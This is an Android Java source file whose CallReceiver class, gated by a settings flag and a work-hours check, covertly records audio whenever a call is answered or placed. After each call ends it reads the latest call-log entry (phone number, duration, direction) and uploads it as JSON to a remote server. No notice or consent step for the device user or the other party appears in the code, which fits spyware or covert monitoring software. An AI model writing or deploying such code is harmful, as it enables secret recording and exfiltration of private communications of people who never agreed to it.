package com.inet.android.call;

import java.util.concurrent.TimeUnit;

import org.json.JSONException;
import org.json.JSONObject;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.os.Bundle;
import android.preference.PreferenceManager;
import android.provider.CallLog;
import android.telephony.TelephonyManager;

import com.inet.android.audio.RecordAudio;
import com.inet.android.request.ConstantRequest;
import com.inet.android.request.RequestList;
import com.inet.android.utils.ConvertDate;
import com.inet.android.utils.Logging;
import com.inet.android.utils.WorkTimeDefiner;

/**
 * Class get call
 * 
 * @author johny homicide
 * 
 */
public class CallReceiver extends BroadcastReceiver {
	private static Context mContext;
	private SharedPreferences sp;
	private static RecordAudio recordAudio = null;
	private static String LOG_TAG = CallReceiver.class.getSimpleName()
			.toString();

	@Override
	public void onReceive(Context context, Intent intent) {
		sp = PreferenceManager.getDefaultSharedPreferences(mContext);
		CallReceiver.mContext = context;
		String call = sp.getString("call", "0");
		Logging.doLog(LOG_TAG,
				"intent: " + intent.getAction() + " " + intent.getExtras(),
				"intent: " + intent.getAction() + " " + intent.getExtras());

		if (call.equals("0")) {
			Logging.doLog(LOG_TAG, "call : 0 " + intent.getAction(), "call : 0"
					+ intent.getAction());
			return;
		}
		boolean isWork = WorkTimeDefiner.isDoWork(mContext);
		if (!isWork) {
			Logging.doLog(LOG_TAG, "isWork return " + Boolean.toString(isWork),
					"isWork return " + Boolean.toString(isWork));
			return;
		} else {
			Logging.doLog(LOG_TAG, "isWork - " + Boolean.toString(isWork),
					"isWork - " + Boolean.toString(isWork));
		}

		Bundle bundle = intent.getExtras();
		String callingSIM = String.valueOf(bundle.getInt("simId", -1));
		if (callingSIM == "0") {
			// Incoming call from SIM1
			Logging.doLog(LOG_TAG, "sim1", "sim1");
		} else if (callingSIM == "1") {
			// Incoming call from SIM2
			Logging.doLog(LOG_TAG, "sim2", "sim2");
		}
		if (intent.getAction()
				.equals("android.intent.action.NEW_OUTGOING_CALL")) {
			// получаем исходящий номер
			Logging.doLog(LOG_TAG, "android.intent.action.NEW_OUTGOING_CALL ",
					"android.intent.action.NEW_OUTGOING_CALL");

		} else if (intent.getAction().equals(
				"android.intent.action.PHONE_STATE")) {
			String phoneState = intent
					.getStringExtra(TelephonyManager.EXTRA_STATE);
			Logging.doLog(LOG_TAG, "android.intent.action.PHONE_STATE ",
					"android.intent.action.PHONE_STATE");

			if (phoneState.equals(TelephonyManager.EXTRA_STATE_RINGING)) {
				// телефон звонит, получаем входящий номер
				Logging.doLog(LOG_TAG, "EXTRA_STATE_RINGING ",
						"EXTRA_STATE_RINGING - ");

			} else if (phoneState.equals(TelephonyManager.EXTRA_STATE_OFFHOOK)) {
				Logging.doLog(LOG_TAG, "TelephonyManager.EXTRA_STATE_OFFHOOK ",
						"TelephonyManager.EXTRA_STATE_OFFHOOK");

			
				setRecord();
				// телефон находится в режиме звонка (набор номера / разговор)
			} else if (phoneState.equals(TelephonyManager.EXTRA_STATE_IDLE)) {
				// телефон находится в ждущем режиме (событие наступает по
				// окончании разговора,
				// когда уже знаем номер и факт звонка
				Logging.doLog(LOG_TAG, "EXTRA_STATE_IDLE " + recordAudio,
						"EXTRA_STATE_IDLE - " + recordAudio);
				stopRecord();
				try {
					// TimeUnit.SECONDS.sleep(1);
					TimeUnit.MILLISECONDS.sleep(1000);
				} catch (InterruptedException e) {
					e.printStackTrace();
				}
				getCallDetails();
			}
		}
	}
	private static void setRecord(){
		recordAudio = new RecordAudio(mContext);
		recordAudio.executeRecording();
	}
	
	private static void stopRecord(){
		if (recordAudio != null) {
			Logging.doLog(LOG_TAG, "recordAudio != null",
					"recordAudio != null");
			recordAudio.executeStopRecording();
		}
	}
	private void getCallDetails() {

		Cursor managedCursor = mContext.getContentResolver().query(
				CallLog.Calls.CONTENT_URI, null, null, null, null);

		int number = managedCursor.getColumnIndex(CallLog.Calls.NUMBER);
		int type = managedCursor.getColumnIndex(CallLog.Calls.TYPE);
		int duration = managedCursor.getColumnIndex(CallLog.Calls.DURATION);

		managedCursor.moveToLast();
		String phNumber = managedCursor.getString(number);
		String callType = managedCursor.getString(type);
		String callDuration = managedCursor.getString(duration);
		int callTypeStr = -1;

		int dircode = Integer.parseInt(callType);

		switch (dircode) {
		case CallLog.Calls.OUTGOING_TYPE:
			callTypeStr = ConstantRequest.TYPE_OUTGOING_CALL_REQUEST;
			break;

		case CallLog.Calls.INCOMING_TYPE:
			callTypeStr = ConstantRequest.TYPE_INCOMING_CALL_REQUEST;
			break;

		case CallLog.Calls.MISSED_TYPE:
			callTypeStr = ConstantRequest.TYPE_MISSED_CALL_REQUEST;
			break;
		}

		managedCursor.close();

		String sendJSONStr = null;
		JSONObject info = new JSONObject();
		JSONObject object = new JSONObject();

		try {

			info.put("number", phNumber);
			info.put("duration", callDuration);

			object.put("time", ConvertDate.logTime());
			object.put("type", callTypeStr);
			object.put("info", info);
			// sendJSONStr = jsonObject.toString();
			sendJSONStr = object.toString();
		} catch (JSONException e) {
			Logging.doLog(LOG_TAG, "json сломался", "json сломался");
		}

		Logging.doLog(LOG_TAG, sendJSONStr);

		RequestList.sendDataRequest(sendJSONStr, mContext);
	}
}
